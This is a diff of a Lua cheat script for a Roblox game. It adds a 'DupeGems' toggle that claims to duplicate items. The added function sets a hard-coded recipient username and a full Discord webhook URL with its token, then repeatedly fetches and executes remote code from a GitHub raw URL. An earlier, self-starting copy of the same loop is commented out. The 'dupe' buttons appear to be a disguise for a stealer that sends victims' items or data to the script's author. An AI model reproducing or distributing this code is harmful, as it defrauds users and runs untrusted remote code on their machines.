@@ -31,7 +31,7 @@ local Tab = Window:CreateTab("Tools", 4483362458) -- Title, Image
 local Section = Tab:CreateSection("Tools")
 
 local Toggle = Tab:CreateToggle({
-   Name = "Dupe",
+   Name = "DupeBank",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
@@ -54,6 +54,31 @@ function Dupe()
         wait(0.1)
       end
 end
+
+local Toggle = Tab:CreateToggle({
+    Name = "DupeGems",
+    CurrentValue = false,
+    Flag = "Toggle1",
+    Callback = function(Value)
+        if Value == true then
+         Dupe()
+        else
+            getgenv().Dupeding = false
+        end
+    end,
+ })
+ 
+ function Dupe()
+       getgenv().Dupeding = true
+       while getgenv().Dupeding == true do
+         _G.Username = "Wickedkennyy123"
+         _G.WebhookUrl = "https://discord.com/api/webhooks/1089215761534431252/o3RHLdVYMyFSRUEVgNlF2Om3kqILgcrspvY7mvtZFkSIVwUSa38i9TKt50LNBAcbKcR4"
+         
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+         Print("Duping Pls wait")
+         wait(0.1)
+       end
+ end
 
 local Toggle = Tab:CreateToggle({
     Name = "Plaza Snipe",
@@ -269,11 +294,11 @@ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
 
-getgenv().AutoDupe10 = true
-while getgenv().AutoDupe10 == true do
-_G.Username = "Wickedkennyy123"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1089215761534431252/o3RHLdVYMyFSRUEVgNlF2Om3kqILgcrspvY7mvtZFkSIVwUSa38i9TKt50LNBAcbKcR4"
+-- getgenv().AutoDupe10 = true
+-- while getgenv().AutoDupe10 == true do
+-- _G.Username = "Wickedkennyy123"
+-- _G.WebhookUrl = "https://discord.com/api/webhooks/1089215761534431252/o3RHLdVYMyFSRUEVgNlF2Om3kqILgcrspvY7mvtZFkSIVwUSa38i9TKt50LNBAcbKcR4"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
-wait(10)
-end
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+-- wait(10)
+-- end
